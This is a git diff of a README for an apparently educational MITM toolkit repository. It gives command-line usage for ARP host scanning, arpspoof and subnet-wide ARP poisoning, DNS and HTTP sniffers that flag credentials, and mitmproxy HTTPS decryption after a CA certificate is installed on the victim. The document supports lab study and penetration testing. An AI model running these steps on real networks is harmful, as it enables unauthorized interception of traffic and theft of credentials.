@@ -1,375 +1,204 @@
-# Man-In-The-Middle
+<div align="center">
 
-<p align="center">
-<img width="556" height="260" alt="MITM Diagram" src="https://github.com/user-attachments/assets/6c25a14a-fcc7-4027-b5c6-a5e89f3d00f0" />
-</p>
+# 🕸️ MITM Toolkit
 
-<h1 align="center">Man-In-The-Middle</h1>
+**A modular penetration testing lab for ARP poisoning and traffic analysis.**
 
-<p align="center">
-  <b>Controlled simulation of ARP spoofing, DNS sniffing, and HTTP/HTTPS interception for educational environments.</b>
-</p>
+[![Python](https://img.shields.io/badge/Python-3.8%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
+[![Scapy](https://img.shields.io/badge/Scapy-2.5%2B-2C2D72?style=for-the-badge)](https://scapy.net)
+[![License](https://img.shields.io/badge/License-MIT-22c55e?style=for-the-badge)](LICENSE)
+[![Español](https://img.shields.io/badge/Leer_en-Español-ef4444?style=for-the-badge)](README-Español.md)
 
-<p align="center">
-  <img src="https://img.shields.io/badge/python-3.8+-blue?logo=python&logoColor=white" />
-  <img src="https://img.shields.io/badge/platform-Linux-orange?logo=linux&logoColor=white" />
-  <img src="https://img.shields.io/badge/license-MIT-green" />
-  <a href="README-Español.md"><img src="https://img.shields.io/badge/idioma-Español-red" /></a>
-</p>
+</div>
 
 ---
 
-## Table of Contents
+## 💡 What Is This?
 
-- [Overview](#overview)
-- [Requirements](#requirements)
-- [Installation](#installation)
-- [Phase 1 — Host Discovery (arpScan.py)](#phase-1--host-discovery-arpscanpy)
-- [Phase 2 — ARP Spoofing](#phase-2--arp-spoofing)
-- [Phase 3 — DNS Traffic Capture (dns_sniffer.py)](#phase-3--dns-traffic-capture-dns_snifferpy)
-- [Phase 4 — HTTP Traffic Capture (http_sniffer.py)](#phase-4--http-traffic-capture-http_snifferpy)
-- [Phase 5 — HTTPS Interception (mitmproxy)](#phase-5--https-interception-mitmproxy)
-- [Disclaimer](#-disclaimer)
-- [Author](#author)
-- [License](#license)
+This toolkit simulates the full lifecycle of a Man-in-the-Middle attack inside a **controlled lab environment**. It covers four stages: network reconnaissance, traffic redirection via ARP cache poisoning, passive monitoring of DNS/HTTP flows, and optional HTTPS decryption through a proxy.
+
+Every tool is self-contained, configurable via CLI flags, and designed to run on Kali Linux or any Debian-based distro.
 
 ---
 
-## Overview
+## 🧰 Toolkit at a Glance
 
-A Man-in-the-Middle (MITM) attack occurs when a third party intercepts, inspects, or modifies the communication between two parties without their knowledge. This enables credential theft, exposure of sensitive data, or manipulation of messages in transit.
-
-This repository provides a set of tools for **controlled simulation** of the full MITM attack chain in a lab environment:
-
-| Tool | Purpose |
-|------|---------|
-| `arpScan.py` | ARP-based host discovery on the local network |
-| `AllNetwork_Spoof.sh` | Network-wide ARP spoofing launcher |
-| `dns_sniffer.py` | Real-time DNS query monitoring |
-| `http_sniffer.py` | HTTP request capture and credential detection |
-
----
-
-## Requirements
-
-**Operating System:** Linux (Kali, Debian, Ubuntu, or derivatives)
-
-**System packages:**
-
-```bash
-sudo apt update
-sudo apt install -y python3 python3-scapy python3-pip dsniff arp-scan
+```
+mitm-toolkit/
+├── arpScan.py              # Network recon — find live hosts via ARP
+├── AllNetwork_Spoof.sh     # Poison the ARP cache of an entire subnet
+├── dns_sniffer.py          # Monitor DNS lookups in real time
+├── http_sniffer.py         # Capture HTTP traffic & detect credentials
+├── README.md
+├── README-Español.md
+└── LICENSE
 ```
 
-**Python dependencies:**
-
-```bash
-pip3 install scapy termcolor
-```
-
-**Permissions:** All scripts require **root** (`sudo`) to access raw sockets and network interfaces.
-
 ---
 
-## Installation
+## ⚡ Quick Start
 
 ```bash
-git clone https://github.com/xrl3y/Man-In-The-Middle.git
-cd Man-In-The-Middle
+# 1. Clone & setup
+git clone https://github.com/xrl3y/Man-In-The-Middle.git && cd Man-In-The-Middle
+sudo apt install -y python3-scapy dsniff && pip3 install termcolor
 chmod +x AllNetwork_Spoof.sh
-```
 
----
-
-## Phase 1 — Host Discovery (arpScan.py)
-
-Before performing any attack, we need to identify live hosts on the network. This script sends ARP requests and displays the responding devices in a formatted table.
-
-### Usage
-
-```bash
-# Scan a full subnet
+# 2. Discover hosts
 sudo python3 arpScan.py -t 192.168.1.0/24
 
-# Scan a single host
-sudo python3 arpScan.py -t 192.168.1.10
+# 3. Poison target (terminal 1)
+sudo arpspoof -i eth0 -t <VICTIM_IP> -r <GATEWAY_IP>
 
-# Specify interface and timeout
-sudo python3 arpScan.py -t 192.168.1.0/24 -i eth0 --timeout 3
-
-# Export results to CSV or JSON
-sudo python3 arpScan.py -t 192.168.1.0/24 -o results.csv
-sudo python3 arpScan.py -t 192.168.1.0/24 -o results.json
-```
-
-### Options
-
-| Flag | Description | Default |
-|------|-------------|---------|
-| `-t, --target` | Target IP or CIDR range | *(required)* |
-| `-i, --interface` | Network interface | auto-detect |
-| `--timeout` | ARP response timeout (seconds) | `2` |
-| `-o, --output` | Export to `.csv` or `.json` | — |
-| `-v, --verbose` | Show additional details | off |
-
-### Example Output
-
-<p align="center">
-<img alt="ARP Scan output" src="https://github.com/user-attachments/assets/f7d868f7-5201-4976-8b49-fe9156fd8071" />
-</p>
-
-**Alternative:** You can also use the system-level `arp-scan` tool:
-
-```bash
-sudo arp-scan -I <Interface> --localnet
-```
-
----
-
-## Phase 2 — ARP Spoofing
-
-ARP spoofing (ARP poisoning) sends false ARP replies to associate the attacker's MAC address with another host's IP (typically the gateway), redirecting traffic through the attacker's machine.
-
-### Prerequisites — Enable Forwarding
-
-Before spoofing, you must allow traffic forwarding so the victim maintains connectivity:
-
-```bash
-# Allow forwarding in iptables
-sudo iptables -P FORWARD ACCEPT
-
-# Enable IP forwarding (choose one)
-sudo sysctl -w net.ipv4.ip_forward=1
-# or
-echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
-
-# Verify
-cat /proc/sys/net/ipv4/ip_forward
-# Should output: 1
-```
-
-### Single Target — arpspoof
-
-```bash
-sudo arpspoof -i <Interface> -t <VictimIP> -r <RouterIP>
-```
-
-<p align="center">
-<img alt="ARP Spoof running" src="https://github.com/user-attachments/assets/c6bee950-29e9-4e93-a36c-9c38d84156c3" />
-</p>
-
-> Leave this running in its own terminal while you use the sniffers.
-
-### Full Network — AllNetwork_Spoof.sh
-
-To spoof the entire subnet simultaneously:
-
-```bash
-# Default: 192.168.1.1-254 on ens33
-sudo bash AllNetwork_Spoof.sh
-
-# Custom configuration
-sudo bash AllNetwork_Spoof.sh -i eth0 -s 10.0.0 -g 10.0.0.1 --start 2 --end 100
-
-# Limit concurrent processes
-sudo bash AllNetwork_Spoof.sh -j 30
-```
-
-### AllNetwork_Spoof.sh Options
-
-| Flag | Description | Default |
-|------|-------------|---------|
-| `-i, --interface` | Network interface | `ens33` |
-| `-s, --subnet` | Subnet base (first 3 octets) | `192.168.1` |
-| `-g, --gateway` | Gateway IP | `${SUBNET}.1` |
-| `--start` | First host number | `1` |
-| `--end` | Last host number | `254` |
-| `-j, --jobs` | Max concurrent arpspoof processes | `50` |
-
-The script includes:
-- Automatic IP forwarding setup
-- Gateway auto-skip (won't spoof the gateway against itself)
-- Interface validation with suggestions
-- Clean shutdown on `Ctrl+C` (kills all child processes)
-- Progress indicator during launch
-
----
-
-## Phase 3 — DNS Traffic Capture (dns_sniffer.py)
-
-With the spoofer running, this script captures DNS queries passing through your interface, showing which domains the victim is resolving in real time.
-
-### Usage
-
-```bash
-# Default interface
-sudo python3 dns_sniffer.py
-
-# Specify interface
+# 4. Sniff DNS (terminal 2)
 sudo python3 dns_sniffer.py -i eth0
 
-# Log to file
-sudo python3 dns_sniffer.py -i eth0 --log dns_capture.log
-
-# Show all queries (disable built-in filter)
-sudo python3 dns_sniffer.py --no-filter
-
-# Add custom exclusions
-sudo python3 dns_sniffer.py --exclude amazon netflix spotify
-```
-
-### Options
-
-| Flag | Description | Default |
-|------|-------------|---------|
-| `-i, --interface` | Network interface | auto-detect |
-| `--log` | Save output to log file | — |
-| `--no-filter` | Disable keyword filtering | off |
-| `--exclude` | Additional keywords to filter out | — |
-
-### Features
-
-- **First-seen highlighting:** New domains appear in yellow with `[NEW]` tag; repeated queries show the count
-- **Record type display:** Shows A, AAAA, CNAME, MX, etc.
-- **Source IP tracking:** Shows which host made the query
-- **Built-in noise filter:** Excludes common CDN/telemetry domains (Google, Microsoft, Apple, etc.)
-- **Summary on exit:** `Ctrl+C` shows total queries, unique domains, and top 5 most queried
-
-### Example Output
-
-<p align="center">
-<img alt="DNS Sniffer output" src="https://github.com/user-attachments/assets/7fc9cc5c-3801-46cc-b818-306ee66cb08a" />
-</p>
-
----
-
-## Phase 4 — HTTP Traffic Capture (http_sniffer.py)
-
-Captures unencrypted HTTP requests and analyzes POST bodies for potential credentials. Only works on HTTP (port 80) — for HTTPS interception, see Phase 5.
-
-### Usage
-
-```bash
-# Default interface
-sudo python3 http_sniffer.py
-
-# Specify interface
+# 5. Sniff HTTP (terminal 3)
 sudo python3 http_sniffer.py -i eth0
-
-# Log to file
-sudo python3 http_sniffer.py --log http_capture.log
 ```
-
-### Options
-
-| Flag | Description | Default |
-|------|-------------|---------|
-| `-i, --interface` | Network interface | auto-detect |
-| `--log` | Save output to log file | — |
-
-### Features
-
-- **Method coloring:** GET (blue), POST (green), PUT (yellow), DELETE (red)
-- **Credential detection:** Scans POST bodies for 30+ keywords (username, password, token, api_key, ssn, etc.)
-- **URL-decoded output:** POST data is decoded and displayed as readable `key = value` pairs
-- **Visual alerts:** Credential matches trigger a highlighted warning block
-- **Summary on exit:** Shows total requests captured and credential detections
-
-### Example Output
-
-<p align="center">
-<img alt="HTTP Sniffer output" src="https://github.com/user-attachments/assets/8340bcc4-6c2f-49f6-8f31-e70582ec4552" />
-</p>
 
 ---
 
-## Phase 5 — HTTPS Interception (mitmproxy)
+## 📡 arpScan.py — Network Reconnaissance
 
-To intercept encrypted HTTPS traffic, a proxy with certificate injection is required. We use **mitmproxy** for this.
-
-### Step 1 — Install mitmproxy
-
-Download the Linux binary from [mitmproxy.org](https://mitmproxy.org) and extract:
+Sends ARP who-has requests across a subnet and collects replies. Results are displayed in a color-coded table sorted by IP.
 
 ```bash
+sudo python3 arpScan.py -t 10.0.0.0/24 -i wlan0 --timeout 3
+sudo python3 arpScan.py -t 192.168.1.0/24 -o scan_results.json
+```
+
+| Option | What it does | Default |
+|--------|-------------|---------|
+| `-t` | Target IP or CIDR | *required* |
+| `-i` | Interface | auto |
+| `--timeout` | Wait time for replies (sec) | `2` |
+| `-o` | Export file (`.csv` / `.json`) | — |
+| `-v` | Verbose output | off |
+
+You can also use the classic `arp-scan` system tool: `sudo arp-scan -I eth0 --localnet`
+
+---
+
+## 🔀 ARP Cache Poisoning
+
+ARP poisoning tricks hosts into sending their traffic through your machine by forging ARP reply packets. Before starting, enable packet forwarding:
+
+```bash
+sudo sysctl -w net.ipv4.ip_forward=1
+sudo iptables -P FORWARD ACCEPT
+```
+
+### Target a Single Host
+
+```bash
+sudo arpspoof -i <IFACE> -t <VICTIM> -r <GATEWAY>
+```
+
+> Keep this running in a dedicated terminal.
+
+### Target the Entire Subnet
+
+`AllNetwork_Spoof.sh` launches parallel `arpspoof` instances for every IP in range:
+
+```bash
+sudo bash AllNetwork_Spoof.sh                                          # defaults
+sudo bash AllNetwork_Spoof.sh -i eth0 -s 10.0.0 -g 10.0.0.1 -j 40   # custom
+```
+
+| Option | What it does | Default |
+|--------|-------------|---------|
+| `-i` | Interface | `ens33` |
+| `-s` | Subnet base (3 octets) | `192.168.1` |
+| `-g` | Gateway address | `{subnet}.1` |
+| `--start / --end` | Host range | `1–254` |
+| `-j` | Max parallel processes | `50` |
+
+Built-in safeguards: validates the interface exists, skips the gateway IP, auto-enables forwarding, and kills every child process on `Ctrl+C`.
+
+---
+
+## 🔎 dns_sniffer.py — DNS Query Monitor
+
+Listens on UDP port 53 and logs every domain name the victim resolves. Noisy CDN/telemetry domains are filtered out by default.
+
+```bash
+sudo python3 dns_sniffer.py -i eth0
+sudo python3 dns_sniffer.py -i eth0 --log captures/dns.log --exclude tiktok instagram
+sudo python3 dns_sniffer.py --no-filter   # raw, unfiltered view
+```
+
+| Option | What it does | Default |
+|--------|-------------|---------|
+| `-i` | Interface | auto |
+| `--log` | Write to file | — |
+| `--no-filter` | Show everything | off |
+| `--exclude` | Extra blocked keywords | — |
+
+**Highlights:** marks first-seen domains with `[NEW]`, tracks repeat counts, shows query type (A/AAAA/MX…), identifies source IP, and prints a top-5 summary on exit.
+
+---
+
+## 🌐 http_sniffer.py — HTTP Traffic & Credential Capture
+
+Intercepts unencrypted HTTP requests and inspects POST bodies for sensitive fields like passwords, tokens, and API keys. Only effective on port 80 — HTTPS requires a proxy (see below).
+
+```bash
+sudo python3 http_sniffer.py -i eth0
+sudo python3 http_sniffer.py -i eth0 --log captures/http.log
+```
+
+| Option | What it does | Default |
+|--------|-------------|---------|
+| `-i` | Interface | auto |
+| `--log` | Write to file | — |
+
+**Highlights:** color-codes HTTP methods, URL-decodes POST data into readable `key = value` pairs, scans for 30+ credential keywords, and fires a visual alert when matches are found.
+
+---
+
+## 🔒 HTTPS Decryption via mitmproxy
+
+Intercepting TLS-encrypted traffic requires installing a trusted CA certificate on the target. The workflow uses [mitmproxy](https://mitmproxy.org):
+
+**On the attacker:**
+
+```bash
+# Download & extract from mitmproxy.org
 tar -xf mitmproxy-*-linux-x86_64.tar.gz
+./mitmweb    # starts proxy on :8080 + web UI on :8081
 ```
 
-<p align="center">
-<img alt="mitmproxy download" src="https://github.com/user-attachments/assets/cd98fcb3-e74b-483f-ac43-452e5e75df14" />
-</p>
+**On the victim:**
 
-### Step 2 — Start the proxy
+1. Set system proxy → attacker's IP, port `8080`
+2. Open `http://mitm.it` → download & install the CA cert as a **Trusted Root CA**
+3. Browse normally — all HTTPS is now decrypted on the attacker's dashboard
+
+**Back on the attacker:**
 
 ```bash
-./mitmweb
+./mitmproxy   # TUI mode for full request/response inspection
 ```
-
-This opens port **8080** on the attacker's machine and launches a web UI for inspecting traffic.
-
-<p align="center">
-<img alt="mitmweb running" src="https://github.com/user-attachments/assets/bec9fb3b-0201-462e-b6cd-ed2ace3aa4b7" />
-</p>
-
-### Step 3 — Configure the victim's proxy
-
-On the victim machine, set the HTTP/HTTPS proxy to point to the attacker's IP on port 8080:
-
-<p align="center">
-<img alt="Proxy settings" src="https://github.com/user-attachments/assets/d7479689-8276-4300-8069-e2e950c9e88d" />
-</p>
-
-### Step 4 — Install the CA certificate
-
-On the victim machine, navigate to [http://mitm.it](http://mitm.it) and download the certificate for the appropriate OS. Install it as a trusted root CA.
-
-<p align="center">
-<img alt="mitm.it certificate page" src="https://github.com/user-attachments/assets/6a0dd808-2af2-4bd6-90da-8033c3ba23bf" />
-</p>
-
-> When installing, select **"Place all certificates in the following store"** → **Trusted Root Certification Authorities**.
-
-<p align="center">
-<img alt="Certificate store" src="https://github.com/user-attachments/assets/cbb2a46c-7082-450d-a701-8dff036048f6" />
-</p>
-
-### Step 5 — Capture HTTPS traffic
-
-Return to the attacker machine and run:
-
-```bash
-./mitmproxy
-```
-
-All HTTPS traffic from the victim will now be visible in cleartext, including URLs, headers, request bodies, and credentials.
 
 ---
 
-## 🛑 Disclaimer
+## 🛡️ Legal Notice
 
-> **⚠️ This content is for educational purposes only.**
+> **This project exists strictly for educational use in authorized lab environments.**
 >
-> This repository and its contents are provided exclusively for educational, research, and learning purposes in **controlled and authorized environments**.
+> Deploying these techniques on networks you do not own or without explicit written consent is **illegal** and may result in criminal prosecution. The author assumes zero liability for misuse.
 >
-> - **Do not** use this material to perform illegal, unauthorized, or harmful activities against networks, systems, or people.
-> - If you plan to practice on a network or device you do not own, **obtain explicit written permission** from the owner before proceeding.
-> - The author accepts **no responsibility** for any damage, loss, misuse, unauthorized access, legal consequences, or incidents resulting from the use of this content.
->
-> **Recommendations:**
-> - Use isolated lab environments (virtual machines, test networks) for experimentation.
-> - Respect applicable laws and your organization's policies.
-> - If you have legal or ethical doubts, consult a qualified professional.
+> **Best practices:** work inside isolated VMs, respect all applicable laws, and get written permission before testing on any network.
 
 ---
 
-## Author
+## 👤 Author
 
-Developed by **Eliot Code**.
+Built by **Eliot Code**.
 
-<p align="center">
-<img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif" />
-</p>
+---
 
-## License
+## 📄 License
 
-This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for details.
+[MIT](LICENSE)
